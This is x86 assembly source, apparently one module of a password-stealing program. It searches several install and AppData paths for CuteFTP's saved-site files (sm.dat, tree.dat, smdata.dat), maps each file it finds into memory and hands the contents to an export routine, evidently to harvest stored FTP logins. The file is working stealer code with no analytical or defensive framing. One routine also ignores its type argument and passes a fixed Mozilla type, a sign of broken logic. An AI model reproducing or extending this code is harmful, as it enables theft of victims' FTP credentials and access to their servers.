; CuteFTP
; Tested on 1.0 Pro, 2.01 Pro, 3.3 Pro, 6.0 Pro
;	    1.7, 1.8, 2.032, 4.018, 4.2, 5.0 XP, 6.0 Home

.data
	@AllocStr	<szCuteSubPath1>,	<"\GlobalSCAPE\CuteFTP\">
	@AllocStr	<szCuteSubPath2>,	<"\GlobalSCAPE\CuteFTP Pro\">
	@AllocStr	<szCuteExeName>,	<"\cutftp32.exe">
	@AllocStr	<szCuteBaseInstall>,	<"C:\Program Files\CuteFTP\">
	@AllocMem	<lpCuteFTPPath>, 	<MAX_PATH+1>

.data
	szCuteSubPaths	db	0,"2.0\",0,"3.0\", 0,"5.0\",0,"6.0\",0,0
	szCuteSmDat	db	"sm.dat",0
	szCuteTreeDat	db	"tree.dat",0
	szCuteSmData	db	"smdata.dat",0

.code

GetCuteFTPDats proc uses esi edi lpDat, dwType: DWORD
	LOCAL	hMap: MappedFile

	invoke	lstrlen, esi
	add	esi, eax

	mov	edi, offset szCuteSubPaths
@list:
	invoke	lstrcpy, esi, edi
	invoke	lstrcat, esi, lpDat 
	
	invoke	MapFile, offset lpCuteFTPPath, addr hMap 
	.IF	eax
		invoke	ExportData, TYPE_MOZILLA_DAT, 0, hMap.lpMem, hMap.dwFileSize
		invoke	UnmapFile, addr hMap
	.ENDIF
	
	@Next @list
	
	ret
GetCuteFTPDats endp

GetCuteFTPNewDirPath proc uses esi dwDirCLSID: DWORD
	push	esi
	push	0
	push	NULL
	push	dwDirCLSID
	push	NULL
	call	dwSHGetFolderPath
	
	.IF	eax == S_OK
		invoke	lstrlen, esi
		add	esi, eax
		
		invoke	lstrcpy, esi, offset szCuteSubPath1
		invoke	GetCuteFTPDats, offset szCuteSmDat, TYPE_CUTEFTP_SM
		
		invoke	lstrcpy, esi, offset szCuteSubPath2
		invoke	GetCuteFTPDats, offset szCuteSmDat, TYPE_CUTEFTP_SM
		
	.ENDIF
	ret
GetCuteFTPNewDirPath endp

GetCuteFTPOutput proc uses esi edi
	; Write header	
	invoke	ExportModule, MODULE_CUTEFTP

	; New versions
	mov	esi, offset lpCuteFTPPath
	.IF	dwSHGetFolderPath
		invoke	GetCuteFTPNewDirPath, CSIDL_APPDATA
		invoke	GetCuteFTPNewDirPath, CSIDL_COMMON_APPDATA
	.ENDIF	
	
	; From default install path
	invoke	lstrcpy, esi, offset szCuteBaseInstall
	invoke	GetCuteFTPDats, offset szCuteSmDat, TYPE_CUTEFTP_SM
	mov 	byte ptr[esi+szCuteBaseInstallLen], 0
	invoke	GetCuteFTPDats, offset szCuteTreeDat, TYPE_CUTEFTP_TREE
	mov 	byte ptr[esi+szCuteBaseInstallLen], 0
	invoke	GetCuteFTPDats, offset szCuteSmData, TYPE_CUTEFTP_SMDATA 
	
	; From MUI
	invoke	GetMUIPath, offset lpCuteFTPPath, offset szCuteExeName
	.IF	eax
		mov	edi, esi
		invoke	lstrlen, offset lpCuteFTPPath
		add	edi, eax
		invoke	GetCuteFTPDats, offset szCuteTreeDat, TYPE_CUTEFTP_TREE
		mov	byte ptr[edi], 0
		invoke	GetCuteFTPDats, offset szCuteSmDat, TYPE_CUTEFTP_SM
		mov	byte ptr[edi], 0
		invoke	GetCuteFTPDats, offset szCuteSmData, TYPE_CUTEFTP_SMDATA
	.ENDIF
	
	ret
GetCuteFTPOutput endp 
